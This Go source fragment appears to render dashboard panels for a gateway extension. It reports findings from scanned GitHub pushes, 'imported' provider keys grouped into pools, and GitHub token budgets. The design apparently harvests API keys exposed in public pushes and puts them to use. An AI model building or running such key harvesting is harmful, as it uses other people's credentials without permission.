		blocks = append(blocks, map[string]interface{}{"kind": "text", "text": "No findings yet. Enable scanning and wait for the next GitHub push."})
	} else {
		blocks = append(blocks, map[string]interface{}{"kind": "list", "items": items})
	}
	return mustJSON(map[string]interface{}{"blocks": blocks})
}

func poolsPayload(cfg config, st *State) string {
	items := make([]string, 0, maxListItems)
	for _, p := range st.Pools {
		members := make([]string, 0, len(p.Members))
		for _, m := range p.Members {
			status := "unknown"
			models := 0
			for _, k := range st.Keys {
				if k.Provider == m {
					status = k.Status
					models = len(k.Models)
					break
				}
			}
			members = append(members, fmt.Sprintf("%s [%s, %d models]", m, status, models))
		}
		items = append(items, fmt.Sprintf("%s (%s) → %s",
			p.Name, serviceName(p.Service), strings.Join(members, ", ")))
	}
	stats := []map[string]string{
		{"k": "Pools", "v": strconv.Itoa(len(st.Pools))},
		{"k": "Providers", "v": strconv.Itoa(len(st.Keys))},
		{"k": "Pool mode", "v": cfg.PoolMode},
	}
	blocks := []interface{}{
		map[string]interface{}{"kind": "kv", "kv": stats},
	}
	if len(items) == 0 {
		blocks = append(blocks, map[string]interface{}{"kind": "text", "text": "No pools yet. The first valid key of a service creates its pool (create_pools=true)."})
	} else {
		blocks = append(blocks, map[string]interface{}{"kind": "list", "items": items})
	}
	return mustJSON(map[string]interface{}{"stats": stats, "blocks": blocks})
}

func githubPayload(cfg config, st *State) string {
	tokens, active, accounts, remaining := activeGitHubStats(st)
	stats := []map[string]string{
		{"k": "Tokens", "v": strconv.Itoa(tokens)},
		{"k": "Active", "v": strconv.Itoa(active)},
		{"k": "Accounts", "v": strconv.Itoa(accounts)},
		{"k": "Remaining", "v": strconv.Itoa(remaining)},
	}
	items := make([]string, 0, maxListItems)
	for _, t := range st.GitHubTokens {
		items = append(items, fmt.Sprintf(
			"%s | %s | %s | %s | from %s | remaining %d | %s",
			orDash(t.Login), t.Kind, maskKey(t.Token), t.Status, orDash(t.Source), t.Remaining, orDash(truncate(t.LastError, 100))))
	}
	blocks := []interface{}{
		map[string]interface{}{"kind": "kv", "kv": stats},
	}
	if len(items) == 0 {
		blocks = append(blocks, map[string]interface{}{"kind": "text", "text": "No GitHub tokens loaded. Add a classic PAT with no scopes in the extension settings."})
	} else {
		blocks = append(blocks, map[string]interface{}{"kind": "list", "items": items})
	}
	blocks = append(blocks, map[string]interface{}{"kind": "divider"})
	blocks = append(blocks, map[string]interface{}{"kind": "text", "text": "Supported token kinds: classic PAT (ghp_), fine-grained PAT (github_pat_), OAuth (gho_) and app user (ghu_). Tokens from the same account share one 5,000/hour budget; different accounts stack. Installation tokens (ghs_) are detected and validated but marked unsupported because the events feed is user-scoped. Tokens marked from settings disappear when you clear the settings field; enable forget_saved_github_tokens to purge tokens pasted in older versions."})
	return mustJSON(map[string]interface{}{"stats": stats, "blocks": blocks})
}

func servicesPayload(cfg config, st *State) string {
	items := make([]string, 0, len(serviceDefs))
	for _, svc := range serviceDefs {
		if svc.ID == "github" {
			continue
		}
		findings := 0
		imported := 0
		for _, f := range st.Findings {
			if f.Service == svc.ID {
				findings++
				if f.Status == "imported" {
					imported++
				}
			}
		}
		var pools []string
		for _, p := range st.Pools {
			if p.Service == svc.ID {
				pools = append(pools, p.Name)
			}
		}
		items = append(items, fmt.Sprintf(
			"%s — import %s | %d finding(s), %d imported | pools: %s",
			svc.Name, enabledLabel(cfg.Services[svc.ID]), findings, imported, orDash(strings.Join(pools, ", "))))
	}
	return mustJSON(map[string]interface{}{
		"blocks": []interface{}{
			map[string]interface{}{"kind": "list", "items": items},
		},
	})
}

func boolLabel(v bool) string {
	if v {
		return "on"
	}
	return "off"
}

func enabledLabel(v bool) string {
	if v {
		return "enabled"
	}
	return "disabled"
}

func adminKeySource(cfg config) string {
	if strings.TrimSpace(cfg.AdminKey) != "" {
		if strings.TrimSpace(envValue("AURORA_MASTER_KEY")) == strings.TrimSpace(cfg.AdminKey) {
			return "AURORA_MASTER_KEY"
		}
		return "extension setting or gateway config"
	}
	return "not found — set admin_key or AURORA_MASTER_KEY"
}
